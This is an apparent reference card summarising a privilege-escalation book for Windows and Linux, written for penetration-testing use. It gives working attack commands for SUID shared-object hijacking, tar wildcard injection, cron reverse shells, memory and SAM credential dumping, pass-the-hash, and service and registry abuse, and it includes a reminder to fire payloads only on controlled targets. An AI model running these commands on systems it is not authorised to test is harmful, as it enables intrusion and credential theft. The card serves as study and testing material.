# 34. Privilege Escalation Techniques

**ISBN** 9781801078870  |  **Lobe** offensive

> A foothold-to-root/SYSTEM cookbook (HackerSploit's Alexis Ahmed): exhaustive local enumeration plus a fixed catalog of Windows and Linux escalation vectors, each shown by hand first and then with Metasploit.

## Reach for this when

- You already have a low-priv shell (web RCE, reused cred, foothold from another finding) and need a structured catalog of next moves to reach root/SYSTEM rather than guessing.
- You want the exhaustive local-enumeration checklist for a freshly-landed Windows or Linux host: system/user/network/password/firewall, before picking any vector.
- You are hunting the classic misconfiguration footholds Nick's CLAUDE.md mandates enumerating - SUID binaries, writable directories, weak service perms, cron jobs - and want the exact commands and the GTFOBins cross-check.
- You need a SUID/shared-object or DLL-hijack primitive to chain a writable-path finding into code execution as the file owner.
- OSCP/PWK-style local-priv-esc muscle memory: you want the manual technique behind the automated suggester so you can fall back when Metasploit's module fails.
- You landed on an embedded/ICS-adjacent Linux box (the OS running mail/DB/web/IDS infrastructure) and need the non-kernel, misconfig-driven escalation surface.

## Principles

- Enumeration is the load-bearing stage, not the exploit. 'If insufficient information regarding the target is obtained, the heist will be marred with mistakes.' Same verification-is-load-bearing ethic as the  methodology, applied to a host instead of a survey set.
- Escalation surface follows OS design philosophy: Windows = SID/RID + access tokens + SAM/registry + services; Linux = UID 0 + world-readable /etc/passwd + SUID bits + cron. Identity is read off the RID, not the username (Administrator=500, Guest=501, Domain Admin=512).
- Automation is a starting point, never a guarantee. local_exploit_suggester recommends netfilter then it FAILS on a missing libc6-dev-i386. 'Trial and error is a big part of the privilege escalation process.' Always know the manual path behind the module.
- Password mining is escalation without an exploit: cleartext creds, password reuse, and leftover deployment files (Unattend.xml/Sysprep Base64 AutoLogon) hand over the box through human failure, not a vuln.
- Access tokens are the heart of Windows escalation: delegate-level tokens (from interactive/RDP logon) can be impersonated on ANY system, which is exactly why Potato attacks and SeImpersonatePrivilege matter.
- Writable + runs-as-root = code execution. SUID binaries loading a writable .so, weak SERVICE_ALL_ACCESS perms, cron over a writable script, AlwaysInstallElevated - all the same class: a privileged context reaching attacker-controlled bytes.

## Moves

- Linux SUID hunt: `find / -type f -perm -u=s -ls 2>/dev/null`, cross-check every hit against GTFOBins (gtfobins.github.io). For a SUID binary that loads a writable .so: write libcalc.c with a `__attribute__((constructor))` that runs `cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p`, `gcc -shared -o ~/.config/libcalc.so -fPIC libcalc.c`, run the binary, confirm with `id`.
- Cron escalation three ways: enumerate `cat /etc/crontab` + linPEAS; PATH abuse - drop `overwrite.sh` with a reverse shell in the dir the cron PATH points at; wildcard abuse - `touch '/home/user/--checkpoint=1'` and `touch '/home/user/--checkpoint-action=exec=sh shell.sh'` against a root `tar ... *` job; file overwrite - append shell to a writable cron script; catch with `nc -nvlp PORT`.
- Linux credential mining: `gdb -p <bash PID>`, `info proc mappings`, `dump memory out <heap-start> <heap-end>`, `strings out | grep passw` to recover a cleartext MySQL/root cred, then reuse via `ssh root@<ip>` or `su` (password reuse is the real vuln). Also `grep -rnw '/' -ie 'PASSWORD'` and `cat ~/.bash_history | grep pass`.
- Windows token impersonation: `whoami /priv` for SeImpersonatePrivilege, then `load incognito` -> `list_tokens -u` -> `impersonate_token "NT AUTHORITY\SYSTEM"`; or ms16_075_reflection; manual path = a Potato exe (book uses RottenPotato - swap in JuicyPotato/PrintSpoofer/GodPotato today).
- Windows service exploitation: unquoted paths via `wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\"`; weak perms via `accesschk64.exe -uwcqv <user> *` then `sc config <svc> binPath= "net localgroup administrators <user> /add"` and restart; DLL hijack - Process Monitor filtered on NAME NOT FOUND + .dll, drop an `msfvenom ... -f dll` in the search path, restart the service, catch SYSTEM on multi/handler.
- Windows hash dump-and-replay: `reg save hklm\sam c:\sam` + SamDump2/PwDump7, or meterpreter `hashdump` / `load kiwi` + `lsa_dump_sam`; crack with `john --format=NT`, or skip cracking and pass-the-hash via exploit/windows/smb/psexec setting SMBPass to the hash.
- Windows registry escalation: `reg query HK..\Installer /v AlwaysInstallElevated` (1=on) then `msiexec /quiet /qn /i setup.msi`; or rewrite a weak service ImagePath: `reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f` and `sc start regsvc`; or replace an Autorun exe with a same-named payload.
- Enumerate-first one-liners to run on landing: Windows `systeminfo | findstr /B /C:"OS Name"`, `wmic qfe`, `whoami /priv /groups`, `net localgroup administrators`; Linux linPEAS / LinEnum / linux-exploit-suggester (`./les.sh`), then `searchsploit linux kernel <ver>`.

## Watch out

- Several techniques are dated. RottenPotato is superseded - reach for JuicyPotato, PrintSpoofer, or GodPotato on modern Windows. Windows-Exploit-Suggester needs Python2 + python-xlrd. The LM-hashing focus is largely legacy. Treat the vectors as a taxonomy, refresh the tooling.
- Lab targets are intentionally soft: Metasploitable2/3, Win7, Stapler, lpeworkshop. The vectors are real but the demos assume no modern mitigations - no EDR, no AMSI, no Credential Guard, no LSASS protection. Real engagements need evasion this book does not cover.
- It is light on Active Directory escalation entirely - no Kerberos, no BloodHound, no delegation abuse beyond local tokens. For domain environments this book stops where the interesting part begins; supplement heavily.
- It is single-host local-priv-esc, not lateral movement or domain dominance. Do not mistake 'root on this box' for the engagement objective - it is one link, not the chain.
- Restraint reminder for  work: this is an exploitation cookbook. Within the survey/recon methodology, the enumeration discipline (SUID, writable paths, weak perms) is in-scope and the finding; actually firing the escalation payload is controlled-target-only, the same VisorAgent ethical-stop line. Names ARE the finding.
- certutil-based transfer and noisy tools (accesschk, Process Monitor, SimpleHTTPServer) leave loud artifacts. Track the footprint - the book demonstrates technique, not opsec.
